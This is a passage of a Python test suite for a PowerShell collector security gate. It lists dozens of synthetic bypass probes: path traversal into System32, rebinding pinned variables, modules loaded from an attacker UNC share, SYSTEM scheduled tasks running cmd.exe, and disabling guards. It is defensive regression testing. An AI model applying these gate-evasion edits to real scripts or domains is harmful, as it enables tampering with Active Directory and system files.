# records (1) ``ast``: a canonical, order-preserving serialization of the WHOLE
# syntax tree — one line per node, pre-order, indented by depth, naming the
# property the node fills in its parent and every semantically relevant scalar
# (operators, names, string values, flags, #Requires, attributes, ...); and
# (2) ``source_sha256``: a digest of the exact source bytes (LF line endings are
# pinned by .gitattributes and CR is refused by check_ast), so comments and
# whitespace (which the AST omits but a script can observe, e.g. via a
# scriptblock's text) are covered too. Any change to a
# collector therefore changes the inventory and fails
# test_inventory_matches_golden until it is regenerated by
# scripts/gen_collector_inventory.py, which refuses unless every semantic check
# above passes.
# ---------------------------------------------------------------------------

GOLDEN_PATH = _REPO / "tests" / "powershell" / "collector-inventory.json"


def _ast_line(row: list[Any]) -> str:
    depth, role, kind, attrs = row[0], row[1], row[2], row[3]
    text = "  " * int(depth) + f"{role}: {kind}"
    for key, value in attrs:
        text += f" {key}={json.dumps(value, ensure_ascii=True)}"
    if len(row) > 4:  # an UNSUPPORTED node also carries its source text
        text += f" text={json.dumps(row[4], ensure_ascii=True)}"
    return text


def _canonical(entry: dict[str, Any]) -> dict[str, Any]:
    return {
        "source_sha256": entry["source_sha256"],
        "parse_errors": entry["parse_errors"],
        "ast": [_ast_line(row) for row in entry["ast_rows"]],
    }


def build_full_inventory(inv: dict[str, dict[str, Any]]) -> dict[str, Any]:
    return {script: _canonical(inv[script]) for script in sorted(POLICIES)}


def _dump_golden(golden: dict[str, Any]) -> str:
    return json.dumps(golden, indent=1, sort_keys=True, ensure_ascii=True) + "\n"


def write_golden_inventory(exe: str) -> dict[str, Any]:
    """Build, semantically validate, and write the golden inventory.

    The generator refuses to write unless every semantic check passes for every
    script. That is the regeneration floor: it can only admit what the semantic
    layer admits, and the resulting golden diff is what a reviewer inspects.
    """
    inv = _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])
    for script in POLICIES:
        run_all_checks(script, inv)
    golden = build_full_inventory(inv)
    GOLDEN_PATH.write_text(_dump_golden(golden), encoding="utf-8")
    return golden


def test_inventory_matches_golden(inventory: dict[str, dict[str, Any]]) -> None:
    assert GOLDEN_PATH.exists(), (
        "tests/powershell/collector-inventory.json is missing; "
        "run `python scripts/gen_collector_inventory.py`"
    )
    committed = json.loads(GOLDEN_PATH.read_text(encoding="utf-8"))
    current = build_full_inventory(inventory)
    if committed != current:
        import difflib

        diff = "\n".join(
            list(
                difflib.unified_diff(
                    _dump_golden(committed).splitlines(),
                    _dump_golden(current).splitlines(),
                    fromfile="committed",
                    tofile="current",
                    lineterm="",
                )
            )[:120]
        )
        raise AssertionError(
            "collector syntax-tree inventory changed. A reviewer must confirm the diff, then "
            "regenerate with `python scripts/gen_collector_inventory.py`:\n" + diff
        )


# Files PowerShell can load as code or configuration. Every one under scripts/
# must be classified (Sol round-3: a .psm1 was outside the glob).
_POWERSHELL_SUFFIXES = (".ps1", ".psm1", ".psd1", ".ps1xml", ".cdxml", ".pssc", ".psrc")


def _unclassified_scripts(root: Path) -> tuple[list[str], list[str]]:
    on_disk = {
        p.relative_to(root).as_posix()
        for p in root.rglob("*")
        if p.is_file() and p.suffix.casefold() in _POWERSHELL_SUFFIXES
    }
    classified = set(POLICIES) | set(OUT_OF_SCOPE)
    return sorted(on_disk - classified), sorted(classified - on_disk)


def test_every_script_is_classified() -> None:
    unclassified, missing = _unclassified_scripts(_SCRIPTS)
    assert not unclassified and not missing, (
        "Every PowerShell file under scripts/ must be in POLICIES or OUT_OF_SCOPE: "
        f"unclassified {unclassified}, missing {missing}"
    )


def test_module_files_need_classification(tmp_path: Path) -> None:
    for name in (*POLICIES, *OUT_OF_SCOPE):
        (tmp_path / name).write_text("", encoding="utf-8")
    (tmp_path / "GpoLensReviewerPayload.psm1").write_text("", encoding="utf-8")
    (tmp_path / "nested").mkdir()
    (tmp_path / "nested" / "Payload.psd1").write_text("@{}", encoding="utf-8")
    unclassified, missing = _unclassified_scripts(tmp_path)
    assert unclassified == ["GpoLensReviewerPayload.psm1", "nested/Payload.psd1"]
    assert missing == []


def test_policy_tables_cover_every_script() -> None:
    for table_name, table in (
        ("WRITE_ROOTS", WRITE_ROOTS),
        ("PINNED_VARS", PINNED_VARS),
        ("INSTANCE_RECEIVERS", INSTANCE_RECEIVERS),
        ("WRITE_TARGET_EXPRESSIONS", WRITE_TARGET_EXPRESSIONS),
        ("SPECIAL_BINDINGS", SPECIAL_BINDINGS),
        ("INDEX_ASSIGNMENT_ROOTS", INDEX_ASSIGNMENT_ROOTS),
        ("COMMON_PARAM_TARGETS", COMMON_PARAM_TARGETS),
        ("LOCAL_FUNCTIONS", LOCAL_FUNCTIONS),
        ("LOCAL_FUNCTION_BODIES", LOCAL_FUNCTION_BODIES),
        ("SECRET_USES", SECRET_USES),
        ("SCRIPT_HEADERS", SCRIPT_HEADERS),
        ("STATEMENT_DIGESTS", STATEMENT_DIGESTS),
        ("PIPELINE_INPUTS", PIPELINE_INPUTS),
        ("SECRET_VARIABLES", SECRET_VARIABLES),
        ("REMOTE_LITERALS", REMOTE_LITERALS),
        ("GUARDED_OPS", GUARDED_OPS),
    ):
        assert set(table) == set(POLICIES), f"{table_name} must have an entry per script"


def test_forbidden_commands_are_never_allowlisted() -> None:
    forbidden = {_cf(c) for c in FORBIDDEN_COMMANDS}
    for script, policy in POLICIES.items():
        hits = sorted(c for c in policy.commands if _cf(c) in forbidden)
        assert not hits, f"{script}: allowlists never-allowed commands {hits}"


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_parses_without_errors(inventory: dict[str, dict[str, Any]], script: str) -> None:
    assert inventory[script]["parse_errors"] == []


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_commands_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    policy = POLICIES[script]
    local = set(inventory[script]["functions"])
    for source in policy.dot_sources:
        local |= set(inventory[source]["functions"])
    check_commands(script, inventory[script], local)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_dotnet_calls_are_allowlisted(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_dotnet(script, inventory[script])
    check_types(script, inventory[script])
    check_instance_receivers(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_using_or_disallowed_redirection(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_usings(script, inventory[script])
    check_redirections(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_new_object_and_add_type(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_new_object_and_add_type(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_local_writes_stay_under_declared_roots(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_writes(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_pinned_variables_are_not_rebound(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_pinned_bindings(script, inventory)


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_scheduled_task_arguments_are_pinned(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_task_action(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_whole_tree_screens(inventory: dict[str, dict[str, Any]], script: str) -> None:
    check_ast(script, inventory[script])
    check_local_functions(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_no_unpinnable_or_engine_bindings(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_bindings(script, inventory[script])


@pytest.mark.parametrize("script", sorted(POLICIES))
def test_write_and_exec_operations_keep_their_guards(
    inventory: dict[str, dict[str, Any]], script: str
) -> None:
    check_guarded_ops(script, inventory)


def test_ad_and_group_policy_cmdlets_are_reads_only() -> None:
    """Every AD/GroupPolicy noun-verb in an allowlist is a Get-*, and only the
    registration script may name the scheduled-task cmdlets."""
    task_cmdlets = {
        "New-ScheduledTask",
        "New-ScheduledTaskAction",
        "New-ScheduledTaskPrincipal",
        "New-ScheduledTaskSettingsSet",
        "New-ScheduledTaskTrigger",
        "Register-ScheduledTask",
        "Unregister-ScheduledTask",
    }
    for script, policy in POLICIES.items():
        directory = {c for c in policy.commands if re.match(r"^\w+-(AD|GP)", c)}
        assert all(c.startswith("Get-") for c in directory), (script, sorted(directory))
        tasks = policy.commands & task_cmdlets
        if script != _TASK_ACTION_SCRIPT:
            assert not tasks, f"{script} must not touch Task Scheduler: {sorted(tasks)}"


# ---------------------------------------------------------------------------
# Regression suite: every reviewer probe (both lineages) must be flagged. Each
# probe appends/prepends one malicious edit to a copy of a real script; the
# full gate must raise for that script. A clean copy must pass.
# ---------------------------------------------------------------------------

# (id, base script, mode, edit). mode is "append"/"prepend" (edit = snippet),
# "before" (edit = (marker, snippet)) or "replace" (edit = (old, new)); the
# marker/old text must occur exactly once. Snippets are synthetic and use
# example.test / LABDOMAIN placeholders only.
Probe = tuple[str, str, str, str | tuple[str, str]]
_REGRESSIONS: list[Probe] = [
    # --- Sol probes ---
    (
        "sol_root_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "sol_registry_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot = 'HKLM:\\Software\\GpoLensGateBypass'\n"
        "New-Item -Path $OutputRoot -Force | Out-Null\n",
    ),
    (
        "sol_set_itemtype",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -ItemType SymbolicLink "
        "-Value '\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Force | Out-Null\n",
    ),
    (
        "sol_redirection",
        "Export-GpoEstate.ps1",
        "append",
        "'owned' > '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_redirection_stream",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'owned' 6> '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'\n",
    ),
    (
        "sol_get_gporeport_path",
        "Export-GpoEstate.ps1",
        "append",
        "Get-GPOReport -All -ReportType Xml "
        "-Path '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "sol_instance_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$unownedFile = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$unownedFile.Delete()\n",
    ),
    (
        "sol_adsi_delete",
        "Export-GpoEstate.ps1",
        "append",
        "$domain = [ADSI]'WinNT://LABDOMAIN,domain'\n$domain.Delete('user', 'victim')\n",
    ),
    ("sol_using_module", "Export-GpoEstate.ps1", "prepend", "using module ./GateEvil.psm1\n"),
    (
        "sol_collector_rebind",
        "Run-GpoLensCollection.ps1",
        "append",
        "$CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "sol_task_abuse",
        "Register-GpoLensCollection.ps1",
        "append",
        "$evilAction = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$evilTask = New-ScheduledTask -Action $evilAction -Principal $principal\n"
        "Register-ScheduledTask -TaskName 'GpoLensGateBypass' -InputObject $evilTask -Force\n",
    ),
    # --- DeepSeek probes ---
    (
        "ds_writeroot_var",
        "Export-GpoEstate.ps1",
        "append",
        "$dest = Join-Path 'C:\\Windows\\System32' 'evil.dll'\n"
        "Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue\n",
    ),
    (
        "ds_writeroot_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$LogPath = 'C:\\Windows\\System32\\evil.log'\n"
        "[IO.File]::AppendAllText($LogPath, 'owned', [Text.UTF8Encoding]::new($false))\n",
    ),
    (
        "ds_adsi_copyto_marker",
        "GpoLensCollectionMarker.ps1",
        "append",
        "([ADSI]'LDAP://CN=victim,OU=x,DC=example,DC=test')"
        ".CopyTo('LDAP://OU=evil,DC=example,DC=test')\n",
    ),
    (
        "ds_register_args",
        "Register-GpoLensCollection.ps1",
        "append",
        "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c whoami'\n"
        "$p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount\n"
        "$t = New-ScheduledTask -Action $a -Principal $p\n"
        "Register-ScheduledTask -TaskName 'NotGpoLens' -InputObject $t -Force\n",
    ),
    (
        "ds_using_assembly",
        "Export-GpoEstate.ps1",
        "prepend",
        "using assembly System.DirectoryServices\n",
    ),
    # --- Negative controls from both lineages (must already be rejected) ---
    (
        "neg_set_adobject",
        "Export-GpoEstate.ps1",
        "append",
        "Set-ADObject -Identity 'x' -Replace @{description='y'}\n",
    ),
    (
        "neg_adsi_commit",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$e.CommitChanges()\n",
    ),
    (
        "neg_dynamic_member",
        "Export-GpoEstate.ps1",
        "append",
        "$e = [ADSI]'LDAP://CN=victim,DC=example,DC=test'\n$m = 'CommitChanges'\n$e.$m()\n",
    ),
    ("neg_com", "Export-GpoEstate.ps1", "append", "New-Object -ComObject 'WScript.Shell'\n"),
    (
        "neg_namespace_de",
        "Export-GpoEstate.ps1",
        "prepend",
        "using namespace System.DirectoryServices\n",
    ),
    (
        "neg_splat_write",
        "Export-GpoEstate.ps1",
        "append",
        "$w = @{ LiteralPath = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\x.txt'; Value = 'owned' }\n"
        "Set-Content @w\n",
    ),
    (
        "neg_addtype_inline",
        "Export-GpoEstate.ps1",
        "append",
        "Add-Type -TypeDefinition 'public static class P { public static void R() {} }'\n",
    ),
    (
        "neg_import_module_unc",
        "Export-GpoEstate.ps1",
        "append",
        "Import-Module '\\\\attacker.example.test\\share\\Evil.psm1'\n",
    ),
    # --- Sol round-2 candidates (19), each previously accepted ---
    # BL-1: variable-writing common parameters rebind a pinned variable.
    (
        "r2_outvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable OutputRoot | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_pipelinevariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -PipelineVariable OutputRoot | "
        "ForEach-Object { Set-Content -LiteralPath $OutputRoot -Value 'owned' }\n",
    ),
    (
        "r2_errorvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Error 'C:\\Windows\\Temp\\gate.txt' -ErrorVariable OutputRoot "
        "-ErrorAction SilentlyContinue\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_warningvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Warning 'C:\\Windows\\Temp\\gate.txt' -WarningVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_informationvariable_rebind_root",
        "Export-GpoEstate.ps1",
        "append",
        "Write-Host 'C:\\Windows\\Temp\\gate.txt' -InformationVariable OutputRoot\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r2_collectorpath_outvariable_override",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\Mutate.ps1' "
        "-OutVariable CollectorPath | Out-Null\n",
    ),
    (
        "r2_taskargs_outvariable_override",
        "Register-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\attacker.example.test\\share\\payload.ps1' "
        "-OutVariable taskArgs | Out-Null\n",
    ),
    # BL-2: receiver-less / parenthesized receivers on side-effecting methods.
    (
        "r2_parenthesized_receiver_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml').Delete()\n",
    ),
    (
        "r2_parenthesized_receiver_open_write",
        "Run-GpoLensCollection.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "Open([IO.FileMode]::Open, [IO.FileAccess]::Write).Write([byte[]](65), 0, 1)\n",
    ),
    (
        "r2_parenthesized_fileinfo_copyto_sysvol",
        "GpoLensCollectionMarker.ps1",
        "append",
        "(Get-Item -LiteralPath 'C:\\Windows\\win.ini')."
        "CopyTo('\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\evil.ini', $true)\n",
    ),
    (
        "r2_wmi_remote_instance_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "([WMI]'\\\\server.example.test\\root\\cimv2:Win32_Environment.Name=\"GATE\"').Delete()\n",
    ),
    # BL-3: scheduled-task operation not pinned.
    (
        "r2_taskname_direct_rebind",
        "Register-GpoLensCollection.ps1",
        "append",
        "$TaskName = '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'\n",
    ),
    (
        "r2_task_unregister_wildcard",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName '*' -Confirm:$false\n",
    ),
    (
        "r2_task_register_remote_cimsession",
        "Register-GpoLensCollection.ps1",
        "append",
        "Register-ScheduledTask -TaskName $TaskName -InputObject $task "
        "-CimSession 'server.example.test' -Force | Out-Null\n",
    ),
    (
        "r2_task_principal_runlevel_highest",
        "Register-GpoLensCollection.ps1",
        "append",
        "$principal = New-ScheduledTaskPrincipal -UserId $account "
        "-LogonType Password -RunLevel Highest\n",
    ),
    # BL-4: pinned root plus unchecked child data.
    (
        "r2_env_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = $env:GPO_LENS_ESCAPE\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = '..\\..\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_computed_dotdot_via_second_variable",
        "Export-GpoEstate.ps1",
        "append",
        "$segment = ([char]46) + ([char]46) + '\\Windows\\Temp\\gate.txt'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $segment) -Value 'owned'\n",
    ),
    (
        "r2_new_item_name_traversal",
        "Export-GpoEstate.ps1",
        "append",
        "New-Item -Path $OutputRoot -Name '..\\..\\Windows\\Temp\\gate.txt' "
        "-ItemType File -Force | Out-Null\n",
    ),
    # --- DeepSeek round-2 candidates ---
    # NEW-BL-1: `..` carried in a non-root child variable / other write forms.
    (
        "ds_dotdot_child_var",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\..\\..\\Windows\\System32\\evil.dll'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot $sub) -Value 'owned'\n",
    ),
    (
        "ds_interp_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\nSet-Content -LiteralPath \"$OutputRoot\\$sub\" -Value 'owned'\n",
    ),
    (
        "ds_writealltext_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n[IO.File]::WriteAllText((Join-Path $OutputRoot $sub), 'owned')\n",
    ),
    (
        "ds_copyitem_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Copy-Item -LiteralPath $testFile -Destination (Join-Path $OutputRoot $sub) -Force\n",
    ),
    (
        "ds_getgporeport_child",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "Get-GPOReport -All -ReportType Xml -Path (Join-Path $OutputRoot $sub)\n",
    ),
    (
        "ds_function_wrapped_write",
        "Export-GpoEstate.ps1",
        "append",
        "$sub = '..\\..\\x'\n"
        "function Invoke-GateWrite { Set-Content -LiteralPath (Join-Path $OutputRoot $sub) "
        "-Value 'owned' }\nInvoke-GateWrite\n",
    ),
    # NEW-BL-2: scope-qualified and foreach rebinds of pinned roots / exec sink.
    (
        "ds_script_scope_outputroot",
        "Export-GpoEstate.ps1",
        "append",
        "$script:OutputRoot = 'C:\\Windows\\System32'\n"
        "Set-Content -LiteralPath (Join-Path $OutputRoot 'evil.dll') -Value 'owned'\n",
    ),
    (
        "ds_foreach_abs_root",
        "Export-GpoEstate.ps1",
        "append",
        "$evil = 'C:\\Windows\\System32'\n"
        "foreach ($OutputRoot in $evil) { Set-Content -LiteralPath "
        "(Join-Path $OutputRoot 'evil.dll') -Value 'owned' }\n",
    ),
    (
        "ds_script_collectorpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:CollectorPath = '\\\\attacker.example.test\\share\\Mutate-Domain.ps1'\n",
    ),
    (
        "ds_script_windowsroot",
        "Register-GpoLensCollection.ps1",
        "append",
        "$script:windowsRoot = 'C:\\attacker'\n",
    ),
    (
        "ds_script_logpath",
        "Run-GpoLensCollection.ps1",
        "append",
        "$script:LogPath = 'C:\\Windows\\System32\\evil.log'\n",
    ),
    # --- Round-3 candidates (Sol / DeepSeek), each previously accepted ---
    # Sol BL-2: receiver rebind onto an allowlisted side-effecting method.
    (
        "r3_receiver_rebind_delete",
        "Run-GpoLensCollection.ps1",
        "append",
        "$entry = Get-Item -LiteralPath "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml'\n"
        "$entry.Delete()\n",
    ),
    # Sol BL-2: the exact allowed vector, duplicated outside ShouldProcess.
    (
        "r3_unregister_duplicate",
        "Register-GpoLensCollection.ps1",
        "append",
        "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false\n",
    ),
    # Sol BL-2: alias-provider assignment re-points a later Get-Item.
    (
        "r3_alias_provider",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "${Alias:Get-Item} = 'Remove-Item'\n"),
    ),
    # Sol BL-1: #Requires auto-imports a module (not an AST node the old
    # inventory recorded).
    (
        "r3_requires_module",
        "Export-GpoEstate.ps1",
        "prepend",
        "#Requires -Modules GpoLensReviewerPayload\n",
    ),
    # Sol BL-1: weaken the reparse-point guard (-or -> -and).
    (
        "r3_guard_or_to_and",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
            "if (-not $root.PSIsContainer -and ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint))",
        ),
    ),
    # Sol BL-1: move the guard after the delete/create it protects.
    (
        "r3_reorder_guard_after_open",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n"
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    # File.Delete unlinks this directory entry; it never writes through a link.\n"
            "    # CreateNew refuses an object substituted between deletion and creation.\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n",
            "    $marker = Join-Path $root.FullName '.gpo-lens-collection-owner'\n"
            "    [IO.File]::Delete($marker)\n"
            "    $stream = [IO.File]::Open($marker, [IO.FileMode]::CreateNew, "
            "[IO.FileAccess]::Write, [IO.FileShare]::None)\n"
            "    if (-not $root.PSIsContainer -or ($root.Attributes -band "
            "[IO.FileAttributes]::ReparsePoint)) {\n"
            "        throw 'Registration refuses a linked output root.'\n"
            "    }\n",
        ),
    ),
    # DeepSeek NEW-BL-1: $PSDefaultParameterValues injects -CimSession into the
    # pinned Register-ScheduledTask call (and parameters anywhere else).
    (
        "r3_psdefault_register_cimsession",
        "Register-GpoLensCollection.ps1",
        "before",
        (
            "function ConvertTo-GpoLensTaskArgument",
            "$PSDefaultParameterValues['Register-ScheduledTask:CimSession'] = "
            "'server.example.test'\n",
        ),
    ),
    (
        "r3_psdefault_export",
        "Export-GpoEstate.ps1",
        "append",
        "$PSDefaultParameterValues['Get-GPOReport:Path'] = "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\overwritten.xml'\n",
    ),
    (
        "r3_psdefault_run",
        "Run-GpoLensCollection.ps1",
        "append",
        "$PSDefaultParameterValues['Remove-Item:Recurse'] = $true\n",
    ),
    # DeepSeek NEW-BL-2: retention guard moved after the recursive delete.
    (
        "r3_reorder_retention_guard",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "            Assert-GpoLensRegularTree -Root $folder\n"
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n",
            "            Remove-Item -LiteralPath $archive.FullName -Force\n"
            "            Remove-Item -LiteralPath $folder -Recurse -Force\n"
            "            Assert-GpoLensRegularTree -Root $folder\n",
        ),
    ),
    # DeepSeek NEW-BL-3 / NON-BL-2: computed common-parameter variable names.
    (
        "r3_outvariable_computed",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ('Output' + 'Root') | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_outvariable_indirect_var",
        "Export-GpoEstate.ps1",
        "append",
        "$n = 'OutputRoot'\n"
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable $n | Out-Null\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r3_errorvariable_computed",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\gate-missing' -ErrorVariable ('Log' + 'Path') "
        "-ErrorAction SilentlyContinue | Out-Null\n",
    ),
    (
        "r3_outvariable_braced",
        "Export-GpoEstate.ps1",
        "append",
        "Get-Item -LiteralPath 'C:\\Windows\\win.ini' -OutVariable ${OutputRoot} | Out-Null\n",
    ),
    # DeepSeek NON-BL-1 / NON-BL-5: a member call's later argument changed.
    (
        "r3_member_later_argument",
        "Export-GpoEstate.ps1",
        "replace",
        (
            '[System.IO.File]::WriteAllText($testFile, "test")',
            '[System.IO.File]::WriteAllText($testFile, "owned")',
        ),
    ),
    (
        "r3_marker_open_mode",
        "GpoLensCollectionMarker.ps1",
        "replace",
        (
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
            "[IO.FileShare]::Read)",
            "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::ReadWrite, "
            "[IO.FileShare]::Read)",
        ),
    ),
    # --- Same classes, found while fixing round 3 (also accepted at d1d4bef) ---
    # A root read by a pinned binding was itself unpinned.
    (
        "r4_marker_root_rebind",
        "GpoLensCollectionMarker.ps1",
        "append",
        "$root = Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies'\n",
    ),
    # A local function's root parameter bound at a new call site.
    (
        "r4_callsite_marker_root",
        "Register-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensOwnerMarkerBytes -OutputRoot "
        "'\\\\dc.example.test\\SYSVOL\\example.test\\Policies' -Bytes ([byte[]](65))\n",
    ),
    (
        "r4_callsite_log_path",
        "Run-GpoLensCollection.ps1",
        "append",
        "Write-GpoLensCollectionLog -LogPath 'C:\\Windows\\System32\\evil.log' -Message 'x' "
        "-LogMaxBytes 1024 -LogFiles 1\n",
    ),
    # Multiple assignment and a filesystem-drive variable write.
    (
        "r4_multi_assignment_root",
        "Export-GpoEstate.ps1",
        "append",
        "$OutputRoot, $gateCount = 'C:\\Windows\\System32', 1\n"
        "Set-Content -LiteralPath $OutputRoot -Value 'owned'\n",
    ),
    (
        "r4_drive_variable_write",
        "Export-GpoEstate.ps1",
        "append",
        "${C:\\Windows\\Temp\\gate.txt} = 'owned'\n",
    ),
    (
        "r4_env_psmodulepath",
        "Export-GpoEstate.ps1",
        "append",
        "$env:PSModulePath = '\\\\attacker.example.test\\share'\n",
    ),
    # ForEach-Object invoking a method by name.
    (
        "r4_foreach_object_member",
        "Run-GpoLensCollection.ps1",
        "append",
        "Get-Item -LiteralPath '\\\\dc.example.test\\SYSVOL\\example.test\\Policies\\victim.xml' "
        "| ForEach-Object Delete\n",
    ),
    # A guard function redefined as a no-op before the entry point runs.
    (
        "r4_guard_function_redefined",
        "Run-GpoLensCollection.ps1",
        "before",
        ("if ($MyInvocation.InvocationName -ne '.')", "function Assert-GpoLensRegularTree { }\n"),
    ),
    # Child data in a pinned write-target expression rebound.
    (
        "r4_safe_name_rebind",
        "Export-GpoEstate.ps1",
        "append",
        "$safe = '..\\..\\..\\Windows\\System32\\evil'\n",
    ),
    # [ref] hands a pinned root to a writer.
    (
        "r4_ref_rebind_root",
        "Run-GpoLensCollection.ps1",
        "append",
        "[guid]::TryParse('x', [ref]$OutputRoot) | Out-Null\n",
    ),
    # --- Round-4 candidates (Sol; DeepSeek helper class), each previously accepted ---
    # Sol BL-1: a helper's emitted value changed to an outside-root FileInfo,
    # which the pinned catch-path Remove-Item then deletes.
    (
        "r4s_helper_returns_outside_file",
        "Run-GpoLensCollection.ps1",
        "replace",
        (
            "if ($zip.GetEntry('AllGPOs.xml')) { $archive }",
            "if ($zip.GetEntry('AllGPOs.xml')) { Get-Item -LiteralPath "
            "'C:\\Windows\\System32\\drivers\\etc\\hosts' }",
        ),
    ),
    # Sol BL-2: the task-argument helper returns a constant UNC -File target.
    (
        "r4s_task_quote_helper_remote_script",
        "Register-GpoLensCollection.ps1",
        "replace",
        (
            "return '\"' + ($Value -replace '(\\\\+)$', '$1$1') + '\"'",
